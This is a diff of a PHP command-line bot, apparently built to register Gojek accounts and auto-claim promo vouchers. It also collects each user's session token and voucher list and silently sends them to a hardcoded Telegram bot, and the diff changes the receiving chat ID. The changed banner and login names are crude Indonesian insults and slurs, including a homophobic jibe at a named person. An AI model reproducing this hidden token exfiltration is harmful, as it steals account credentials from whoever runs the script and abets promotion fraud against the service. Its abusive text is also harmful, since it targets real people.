@@ -2,11 +2,11 @@
 date_default_timezone_set('Asia/Jakarta');
 include "function.php";
 echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
-echo "\e[92m| __\e[93mDaftar\e[92m_\e[93mAkun\e[92m_\e[93m+\e[92m_\e[93mAuto\e[92m_\e[93mClaim\e[92m_\e[93mVoucher\e[92m_\e[93mFood\e[92m_____|\n";
-echo "\e[92m| ____________\e[93m•_+\e[92m_\e[93mBuat\e[92m_\e[93mPIN\e[92m_\e[93m-_•\e[92m________________|\n";
-echo "\e[92m| __\e[91mUNTUK\e[92m_\e[91mREGISTRASI\e[92m_\e[91mSILAHKAN\e[92m_\e[91mHUBUNGI\e[92m_\e[91mADMIN\e[92m___|\n";
-echo "\e[92m| ___\e[93mTELEGRAM\e[92m_:\e[93m@xxxxxx\e[92m______________________|\n";
-echo "\e[92m| ___\e[93mGITHUB\e[92m___:\e[93mxxxxxxxxxxxxx\e[92m______________|\n";
+echo "\e[92m| __\e[93mSEBELUM\e[92m_\e[93mREGIST\e[92m_\e[93m+\e[92m_\e[93mWAJIB\e[92m_\e[93mNGAKU\e[92m_\e[93mKALO\e[92m_\e[93mARI\e[92m_____|\n";
+echo "\e[92m| ____________\e[93m•_+\e[92m_\e[93mBAWELL\e[92m_\e[93mDAN\e[92m_\e[93m-_•\e[92m________________|\n";
+echo "\e[92m| __\e[91mBEWOK\e[92m_\e[91mGENDUT\e[92m_\e[91mPANJI\e[92m_\e[91mHOMO\e[92m_\e[91mHAHAHA\e[92m___|\n";
+echo "\e[92m| ___\e[93mSAYAGILA\e[92m_:\e[93m@xxxxxx\e[92m______________________|\n";
+echo "\e[92m| ___\e[93mSUKACOLI\e[92m___:\e[93mxxxxxxxxxxxxx\e[92m______________|\n";
 echo "\e[92m| ___\e[93mVersion\e[92m__:\e[93mABANG\e[92m_\e[93m-\e[92m_\e[93mOPIK\e[92m_\e[93m21😷\e[92m_____________|\n";
 echo "\e[92m| ___\e[93mTime\e[92m_____:\e[93m".date('[d-m-Y] [H:i:s]')."\e[92m________|\n";
 echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
@@ -23,7 +23,7 @@ $pass =  ( '║ User Login : ' );
 echo "\033[30;40m";
 $user = trim(fgets(STDIN));
 echo "\033[0m";
-if($user == "y" || $user == "puput" || $user == "pahrudin" || $user == "nganu" || $user == "alfi" || $user == "ilham" || $user == "rama" || $user == "mika")
+if($user == "y" || $user == "puput" || $user == "pahrudin" || $user == "nganu" || $user == "ari" || $user == "bewok" || $user == "jembut" || $user == "memek")
 {
 	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
@@ -36,10 +36,10 @@ else
 {
 		echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";	
 		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
-		echo "\e[92m[🚫]        \e[91mMasukkan User Registrasi      \e[92m [🚫]\n";
-	        echo "\e[92m[🚫]              \e[91m⚠️ ERROR ⚠️             \e[92m [🚫]\n";
-		echo "\e[92m[🚫]           \e[91mWKWKWKWKWK          \e[92m [🚫]\n";
-	        echo "\e[92m[🚫]          \e[91mNANYA MAKANYA       \e[92m [🚫]\n";
+		echo "\e[92m[🚫] \e[91mMasukkan User Registrasi   \e[92m [🚫]\n";
+	        echo "\e[92m[🚫]       \e[91m⚠️ ERROR ⚠️           \e[92m [🚫]\n";
+		echo "\e[92m[🚫]    \e[91mWKWKWKWKWK              \e[92m [🚫]\n";
+	        echo "\e[92m[🚫]   \e[91mNANYA MAKANYA TONG       \e[92m [🚫]\n";
 		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 goto login;
 }
@@ -128,8 +128,8 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD160420B"}');
         $message = fetch_value($code1,'"message":"','"');
         echo "\n".color("green","🔓▶️ Message: ".$message);
-        echo "\n".color("white","🔐▶️ Claim voc CASHBACK GOPAY 10K");
-        echo "\n".color("yellow","⏳▶️ Please wait");
+        echo "\n".color("white","🔐▶️ TERAHIR DEH YG PALING ANU");
+        echo "\n".color("yellow","⏳▶️ OKE , TUNGGU DULU SAMPE 12 JAM");
         for($a=1;$a<=3;$a++){
         echo color("white",".");
         sleep(3);
@@ -183,7 +183,7 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
         $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
         $TOKEN  = "1108435265:AAFmowORq5hfBf4NQqmfjmQbPaHnssfxW5o";
-	$chatid = "1108435265";
+	$chatid = "1464892917";
 	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
 	$method	= "sendMessage";
 	$url    = "https://t.me/RRR044" . $TOKEN . "/". $method;
